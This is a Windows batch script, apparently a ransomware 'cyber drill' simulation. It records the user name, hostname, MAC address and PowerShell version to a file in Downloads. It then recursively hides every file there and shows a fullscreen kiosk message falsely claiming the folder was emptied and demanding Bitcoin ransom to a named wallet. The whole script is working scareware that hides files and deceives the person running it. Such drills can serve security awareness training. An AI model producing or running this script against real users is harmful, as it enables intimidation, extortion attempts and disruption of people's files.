@echo off

set "timestamp=%date%_%time%"
set "timestamp=%timestamp: =_%"
set "timestamp=%timestamp::=-%"
set "timestamp=%timestamp:/=-%"

set "filepath=%userprofile%\Downloads\cyber_drill_%timestamp%.txt"
			
type nul > "%filepath%"

echo --------------------Status Report--------------------- >> "%filepath%"
date /t >> "%filepath%"
time /t >> "%filepath%"
echo --------------------Active User--------------------- >> "%filepath%"
whoami >> "%filepath%"
echo --------------------Host Name--------------------- >> "%filepath%"
Hostname >> "%filepath%"
echo --------------------Internet Conenctivity--------------------- >> "%filepath%"
ping -n 2 www.google.com >> "%filepath%"
echo --------------------MAC Address--------------------- >> "%filepath%"
Getmac >> "%filepath%"
echo --------------------Powershell Version--------------------- >> "%filepath%"
powershell.exe $PSVersionTable >> "%filepath%"
cd c:\Users\%username%\Downloads
ATTRIB +h *.* /S /D
echo --------------------Your Downloads Folder has been emptied, Please pay RANSOM in Bitcoins @a24acc617d448caa129684c1661bb9fb2fb4e14cd0ef7b9d14be9f2b8649af29 wallet------- >> "%filepath%"
start msedge --kiosk "%filepath%" --edge-kiosk-type=fullscreen

echo --------------------End of Report--------------------- >> "%filepath%"